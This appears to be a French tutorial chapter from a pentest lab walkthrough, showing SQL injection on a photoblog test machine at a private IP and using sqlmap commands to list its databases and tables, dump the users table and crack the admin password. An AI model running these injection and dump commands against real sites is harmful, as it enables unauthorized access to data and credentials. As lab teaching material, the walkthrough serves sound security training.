# 4. Injections SQL

![](https://lh3.googleusercontent.com/MCFpdhR9rJscOTH-k5-Ib8sFzZXqT2VYT4TlSVXhoi4NIjKg9A56zBAn1OWG4DNOWW0GmOvWswmwh5dVRClz8NiB9Lw7xo_1gS__anOrgnMaNTehs9E1X1Turty7vkMOL0Ba1WLY)

Essayons de trouver si le site est vulnérable aux injections SQL

![](../.gitbook/assets/image%20%2822%29.png)

Bingo, en ajoutant `'` au paramètre `id` du script `cat.php`, on obtient une erreur de syntaxe SQL. Techniquement, le code PHPqui se cache derrière cela est le suivant :

![](../.gitbook/assets/image%20%2820%29.png)

La valeur fournie à l'utilisateur `($_GET["id])` est directement répercutée dans la requête SQL sur la ligne 3. Si un utilisateur tente d'accéder à l'URL `(/cat.php?id=2')`, la requête suivante sera exécutée `(SELECT * FROM articles WHERE id=2')`.

Cependant, la syntaxe de cette requête SQL est incorrecte à cause de l'unique guillemet `(')` et la base de données lancera une erreur qui est mauvaise.

{% hint style="info" %}
Ne montrez pas vos codes de débogage et d'erreur à un pirate
{% endhint %}

### **sqlmap**

{% embed url="http://sqlmap.org/" %}

Une injection SQL c’est le faite d’attaquer une base de données en envoyant des requêtes SQL afin d’essayer de récupérer des informations de la base de données \(structure, utilisateurs, mots de passe…\).

**Sqlmap** est un outil open source permettant d'identifier et d'exploiter une injection SQL sur des applications web. Outre la simple exploitation d'une injection SQL, il fournit également des fonctionnalités permettant la prise de contrôle de l'équipement hébergeant la base de données. Il est devenu aujourd'hui indispensable dans la trousse à outils de tout pentester. Cet article a pour objet de vous présenter les dernières fonctionnalités de l'outil, ainsi que son utilisation dans des cas pratiques.

Lors de l'utilisation de sqlmap sans aucune option particulière, l'outil va tout d'abord déterminer la possibilité d'injecter du code SQL dans l'un des paramètres de la requête HTTP fournie.

```text
$ sudo apt install sqlmap

$ sqlmap --url='http://192.168.200.128/cat.php?id=1' --dbs
```

![](https://lh5.googleusercontent.com/dWJkQ1HuTO456ANTkrvUMfMV0Zao0UF5TxKT-VghfJyqoKGXzd7K1tDlC9lRKCjd7z20y6jGlRRTOuS_y3tj4mARHl6p0h-RLn4UkLYgBZtyqxTP79HlgcE_P0-IkVyZJ9LjlMng)

{% hint style="info" %}
Deux base de données sont présent dans la base de donnée MySQL information\_schema et photoblog
{% endhint %}

Maintenant que nous savons qu'une injection SQL est possible, nous souhaitons pouvoir extraire les informations présentes dans la base de données `photoblog`. 

Il est possible de lister les tables \(`--tables`\) et les colonnes \(`--columns`\) présentes dans la base de données, ainsi que de récupérer leur contenu \(`--dump`\). 

```text
$ sqlmap --url='http://192.168.200.128/cat.php?id=1' --tables -D photoblog
```

![](https://lh3.googleusercontent.com/AO8x07j86fQAE-gqjPEhOGeaTRjxWCre8JXdZZl6a_n4h_tO3KH7kZziojKv5zfB7DnN95RA7wLZmBoBoTxTgRIJ0yO4_9FzFkdk2nXgI8wx0E2i7dKLdcnv79TwnEDXAXUzzv5d)

{% hint style="info" %}
3 tables sont présentes dans la base de données photoblog.
{% endhint %}

Intéressons-nous à la table `users`

```text
$ sqlmap --url='http://192.168.200.128/cat.php?id=1' --columns -T users -D photoblog
```

![](https://lh3.googleusercontent.com/Bx7QmaP1QnOcs7WuOJ5__W7kf2qj8OqrMK38v7D7L_LYUrNYq_-c1y1wN6nJyVTQJty_4nrz0FOHziQfVRqDxESX21psVsEM0u985Qh1JS-SN7ayA1qFjO2MKL9MAAbS-Pvlu8XS)

{% hint style="info" %}
La table `users` contient bien les login est les mots de passe des utilisateurs
{% endhint %}

**Sqlmap** est en mesure d'identifier certains algorithmes de hachage couramment utilisés par les bases de données du marché, notamment : 

* les fonctions de hachage utilisées par MySQL, PostgreSQL, Microsoft SQL Server et Oracle afin de stocker les mots de passe de la base de données ;
* la fonction MD5 ;
* la fonction SHA-1.

Lorsque sqlmap identifie l'utilisation de l'une de ces fonctions, l'outil est en mesure d'effectuer une attaque par force brute ou par dictionnaire \(soit avec son dictionnaire intégré ou un dictionnaire pouvant être défini par l'utilisateur\) afin de retrouver la valeur du condensat.

```text
$ sqlmap --url='http://192.168.200.128/cat.php?id=1' --dump -T users -D photoblog
```

![](https://lh4.googleusercontent.com/yhIA0bf0Mu3MkeFf949b6jSNmks0DyJScob0yJqOnve1pYu6zw1X2BOwjqpWOwf_jhHsV0Yg3bDspdmGBBnd5BR6-LB3bxtqeM9gCwrrUmw2_UX0dzChR1djkEKCJ3p0YY16xHoe)

{% hint style="info" %}
Le mot de passe du compte `admin` est `P4ssw0rd`
{% endhint %}

